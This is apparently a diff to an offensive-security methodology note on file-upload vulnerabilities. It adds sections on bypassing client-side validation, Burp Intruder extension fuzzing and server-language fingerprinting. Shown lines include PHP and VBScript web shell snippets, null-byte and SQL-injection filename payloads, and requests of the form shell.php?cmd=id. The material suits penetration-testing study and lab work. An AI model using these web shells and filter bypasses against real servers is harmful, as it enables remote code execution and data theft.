@@ -29,8 +29,6 @@ When a web server receives a request for a `.php` file and the server is configu
 - The uploaded file is accessible via HTTP (or can reach a directory that is)
 - For Content-Type bypass: the server trusts the client-supplied `Content-Type` header without verifying actual file contents
 
-## Methodology
-
 ### 1. Upload an unrestricted web shell
 
 If there are no protections at all, upload a minimal PHP web shell:
@@ -285,8 +283,6 @@ pngcrush -text a "profile" "/etc/passwd" exploit.png
 #EXT-X-ENDLIST
 ```
 
-## Key payloads / examples
-
 ### Minimal read-file shell
 
 ```php
@@ -356,8 +352,6 @@ filename="shell.php%00.png"
 | Reddit | Unrestricted File Upload on reddit.secure.force.com | Low | $100 | [#1606957](https://hackerone.com/reports/1606957) |
 
 **Patterns:** Unrestricted extension/MIME validation on Salesforce-hosted endpoints. Low bounty reflects limited impact (no RCE achieved), but demonstrates that even large programs miss upload controls on third-party integrations.
-
-## From the Wild
 
 ### HTB — Magic (2020)
 - **Technique variant**: Double extension exploiting missing `$` anchor in Apache FilesMatch
@@ -486,8 +480,6 @@ sleep(10)-- -.jpg
 <%@ Language=VBScript %>
 <% Response.Write(CreateObject("WScript.Shell").Exec("cmd.exe /c whoami").StdOut.ReadAll()) %>
 ```
-
-## PortSwigger Labs
 
 ### Lab 1 — Remote code execution via web shell upload (Apprentice)
 
@@ -748,3 +740,95 @@ Bypass: a double extension whose first-dot segment is an allowed image type and 
 Tell-tale to look for: a plain `.gif`/`.jpg` uploads fine but every `.php` variant is rejected "not an image" -> the filter is extension-based (not content-based), so probe first-dot and case permutations, not just the trailing extension. (Seen in the wild on Monitorr 1.7.6m, CVE-2020-28871.)
 
 <!-- promoted-slug: upload-firstdot-allowlist-bypass -->
+
+## Client-side-only validation: detect the tell, then disable it in the DOM
+
+**Tell that validation is JS-only:** the rejection message appears and the Upload button
+disables the instant a file is selected, with NO HTTP request fired and no page refresh
+(watch the proxy history / network tab while selecting the file). All client-side code is
+under the attacker's control; if the back-end repeats none of the checks, any file type
+goes through.
+
+Two bypass lanes, neither needs a payload mutation:
+
+1. **Proxy lane:** capture the multipart POST in Burp, change
+   `filename="avatar.png"` to the script name and swap the body; forward.
+2. **DOM lane (no proxy):** open dev tools, inspect the file input, and delete the
+   validation hook plus the picker filter:
+
+```html
+<input type="file" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
+```
+
+Remove `onchange="checkFile(this)"` (the extension check), and optionally
+`accept=".jpg,.jpeg,.png"` (only greys out the file picker, cosmetic) or reduce a wrapped
+`onSubmit="return validate(); upload()"` to the bare `upload()` call. Edits are
+client-side and temporary; they only need to survive one upload.
+
+**Finding the stored file:** after a successful upload, re-inspect the element that
+renders it (e.g. the profile `<img src="/profile_images/shell.php">`) for the stored
+path, then execute:
+
+```http
+GET /profile_images/shell.php?cmd=id
+```
+
+<!-- promoted-slug: upload-client-side-validation-dom-bypass -->
+
+## Denylist extension fuzzing in Burp Intruder (triage mechanics)
+
+Proxy-side variant of the ffuf denylist fuzz above (keeps the run visible in Burp instead
+of a hand-rolled loop):
+
+1. Send the failed upload request to Intruder; `Clear` all positions, select ONLY the
+   extension in `filename="shell.§php§"` and `Add` it.
+2. Payloads: load a PHP extensions list (PayloadsAllTheThings `Extension PHP` list, or
+   the SecLists web-extensions list). **Un-tick Payload Encoding**, or the `.` before the
+   extension gets URL-encoded and the test is void.
+3. Sort results by response Length: accepted and rejected extensions form distinct
+   length clusters ("File successfully uploaded" vs "Extension not allowed"); every
+   member of the short/success cluster is a denylist gap.
+
+Not every ACCEPTED extension EXECUTES on a given server config; `.phtml` and `.phar`
+are the usual first hits. Cycle the accepted cluster, requesting each stored file with
+`?cmd=id`, until one returns command output.
+
+Remember denylist checks are often case-sensitive while the filesystem is not
+(especially Windows): a mixed-case `.pHp` can slip a literal `php` block and still
+execute.
+
+<!-- promoted-slug: upload-denylist-intruder-triage -->
+
+## Fingerprint the executing language before crafting the shell
+
+A web shell must be written in the language the server actually executes; uploading the
+wrong language "succeeds" and then never runs. When URL routes hide the extension
+(no `.php` in any path), identify the runtime first:
+
+- Request `/index.php`, `/index.asp`, `/index.aspx`, `/index.jsp` in turn; the one that
+  returns the index page names the language (index pages are usually hidden, so probe
+  them explicitly).
+- Or fuzz `index.FUZZ` in Burp Intruder with the SecLists `web-extensions.txt` list.
+- Wappalyzer (browser extension) corroborates language + web server + OS in one click;
+  know the manual `/index.ext` probe as the fallback.
+
+Note: on web-route frameworks the uploaded file may not be directly routable at all;
+if no static serve path exists for uploads, extension tricks are moot until a route to
+the stored file is found.
+
+### Benign echo probe (execution test before weaponizing)
+
+Upload a harmless script instead of a shell first, and read the response:
+
+```php
+<?php echo "Hello"; ?>
+```
+
+- The greeting renders = uploaded code EXECUTES; escalate straight to a web shell.
+- The raw `<?php` source prints back = the file was stored but NOT executed
+  (storage-only sink, or wrong handler mapping); do not waste a shell on it.
+
+This complements the 404-differential probe above: that one proves the DIRECTORY
+executes scripts; this one proves YOUR uploaded file executes.
+
+<!-- promoted-slug: upload-shell-language-fingerprinting -->
